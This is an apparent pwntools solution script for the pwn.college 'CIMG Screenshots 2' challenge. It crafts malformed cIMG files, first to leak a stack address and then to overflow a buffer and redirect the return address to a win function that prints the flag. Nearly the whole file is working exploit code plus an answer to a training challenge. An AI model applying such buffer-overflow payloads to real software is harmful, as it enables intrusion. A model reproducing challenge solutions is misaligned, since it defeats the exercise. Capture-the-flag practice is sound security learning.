#!/usr/bin/env python3
"""CIMG Screenshots 2 — FINAL: jump to 0x405470 (mov rsp,rbp; write; open; read; write /flag)."""

from pwn import *

context.log_level = "info"
BIN = "/challenge/integration-cimg-screenshot-win"
WIN = 0x405470  # printable: 0x70='p', 0x54='T', 0x40='@'


def cimg_hdr(w, h, n):
    return b"cIMG" + p16(4) + p8(w) + p8(h) + p32(n)


# ─── leak ───
stat = open("/proc/self/stat", "rb").read()[:255].ljust(255, b"\x00")
rgba = b"".join(bytes([0, 0, 0, b]) for b in stat)
cimg = cimg_hdr(255, 1, 2) + p16(1) + rgba + p16(6) + b"\x00"
with open("/tmp/lk.cimg", "wb") as f:
    f.write(cimg)
p = process([BIN, "/tmp/lk.cimg"])
out = p.recvall(10)
p.close()
import re

ss = int(b"".join(re.findall(rb"m(.)\x1b\[0m", out)).decode().split()[27])
log.success(f"startstack={hex(ss)}")

# ─── exploit ───
# Overwrite ret addr (buffer offset 168-170) with low 3 bytes of 0x405470
# Bytes: 0x70, 0x54, 0x40 — all printable
# Saved rbp (offset 144-151) also overwritten but 0x405470 sets rbp=rsp, so it doesn't matter!
OVERFLOW_W = 171

raw = bytearray(255)
for i in range(255):
    raw[i] = 0x41  # 'A' filler
raw[168] = 0x70  # 'p'
raw[169] = 0x54  # 'T'
raw[170] = 0x40  # '@'

rgba = b"".join(bytes([0, 0, 0, b]) for b in raw)
cimg = cimg_hdr(255, 1, 2) + p16(1) + rgba + p16(1337) + bytes([0, 0, 0, OVERFLOW_W, 1])
with open("/tmp/ex.cimg", "wb") as f:
    f.write(cimg)

log.info("Running exploit → 0x405470")
p = process([BIN, "/tmp/ex.cimg"])
out = p.recvall(10)
p.close()

flag = re.search(rb"pwn\.college\{[^}]+\}", out)
if flag:
    log.success(f"FLAG: {flag.group().decode()}")
else:
    clean = re.sub(rb"\x1b\[[0-9;]*m", b"", out)
    log.info(f"exit={p.returncode} len={len(out)}")
    if clean.strip():
        log.info(f"output: {clean[:500]}")
